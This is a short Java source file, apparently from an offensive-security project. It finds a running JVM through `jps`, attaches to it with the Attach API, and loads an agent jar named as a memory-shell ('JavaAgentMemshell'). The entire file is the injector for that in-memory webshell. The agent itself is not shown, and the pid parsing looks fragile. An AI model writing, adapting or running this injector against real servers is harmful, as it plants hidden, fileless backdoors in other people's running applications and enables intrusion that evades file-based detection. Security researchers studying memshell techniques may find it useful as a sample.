package test;

import com.sun.tools.attach.VirtualMachine;
import java.util.Scanner;

public class TestAttach {
    public static void main(String[] args) throws  Exception{
        String pid = getpid();
        System.out.println("find jar pid:"+pid);
        if (!pid.equals("not found")) {
            String currentPath = test.TestAttach.class.getProtectionDomain().getCodeSource().getLocation().getPath();
            currentPath = currentPath.substring(0, currentPath.lastIndexOf("/") + 1);
            String agentFile = currentPath.substring(1, currentPath.length()) + "JavaAgentMemshell_Agent-1.0-SNAPSHOT-jar-with-dependencies.jar".replace("/", "\\");
            VirtualMachine vm = VirtualMachine.attach(pid);
            vm.loadAgent(agentFile);
            vm.detach();
        }

    }

    private static String getpid() throws Exception{
        Scanner sc  = new Scanner(Runtime.getRuntime().exec("jps").getInputStream());
//        StringBuilder sb=new StringBuilder();
        while (sc.hasNextLine()){
            String a = sc.nextLine();
            if(a.contains("jar"))
            {
                return a.substring(0,a.length()-4);
            }
        }
        return "not found";
    }



}

